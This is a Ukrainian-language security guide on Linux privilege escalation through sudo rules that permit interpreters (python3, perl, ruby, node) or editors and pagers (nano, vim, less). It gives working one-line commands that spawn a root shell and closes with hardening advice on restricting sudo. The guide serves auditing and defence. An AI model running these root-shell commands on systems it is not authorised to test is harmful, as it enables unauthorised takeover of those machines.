## Інтерпретатори, дозволені Sudo

Якщо `sudo -l` дозволяє користувачу запускати інтерпретатор від імені root, розглядайте це як безпосереднє виконання коду. Інтерпретатори призначені для виконання довільного коду, тому правило, яке дозволяє запускати `python3`, `perl`, `ruby`, `lua`, `node` або подібні бінарні файли, зазвичай еквівалентне виконанню команд від імені root, якщо аргументи не мають суворих обмежень і не проходять перевірку.

Типовий процес перевірки:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Інші приклади інтерпретаторів:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Точний шлях має значення. Якщо правило sudo дозволяє `/usr/bin/python3`, використовуйте саме цей шлях під час перевірки:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Редактори, дозволені через sudo

Якщо `sudo -l` дозволяє користувачу запускати інтерактивний редактор від імені root, розглядайте це як поверхню виконання команд, а не як нешкідливий дозвіл на редагування файлів. Редактори часто можуть виконувати shell-команди, читати довільні файли, записувати довільні файли або викликати зовнішні допоміжні програми безпосередньо з редактора.

Типовий процес перевірки:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Виконання команд у Nano

Якщо запуск `nano` дозволено через sudo, виконання команд може бути доступним з інтерфейсу редактора:
```text
Ctrl+R
Ctrl+X
```
Потім надайте команду, наприклад:
```bash
id
/bin/sh
```
На деяких терміналах інтерактивній оболонці може знадобитися перенаправлення стандартних потоків:
```bash
reset; /bin/sh 1>&0 2>&0
```
Точна послідовність клавіш може відрізнятися залежно від версії та параметрів збірки nano, але проблема безпеки залишається тією самою: редактор працює від імені root і може виконувати зовнішні команди.

### Інші поширені способи виходу з редактора

Редактори у стилі Vim зазвичай надають доступ до виконання команд через `:!`:
```text
:!/bin/sh
```
Пейджери, такі як `less`, також можуть відкривати можливість виконання shell-команд:
```text
!/bin/sh
```
## Захисні примітки

- Уникайте надання через sudo інтерпретаторів або інтерактивних редакторів.
- Віддавайте перевагу незмінним обгорткам, що належать root, які виконують одну вузьку адміністративну дію.
- Якщо інтерпретатор неминучий, обмежте точний шлях до скрипта та забороніть керовані користувачем аргументи, доступні для запису імпорти, `PYTHONPATH` і небезпечне збереження середовища.
- Якщо редагування файлів необхідне, обмежте точний шлях до файлу та розгляньте використання `sudoedit` із пропатченими версіями sudo і суворим керуванням середовищем.
- Перевіряйте `SETENV`, `env_keep`, доступні для запису робочі каталоги, доступні для запису шляхи до модулів/імпортів, `NOEXEC`, `use_pty` і ведення журналів, але не вважайте їх повноцінним sandbox.
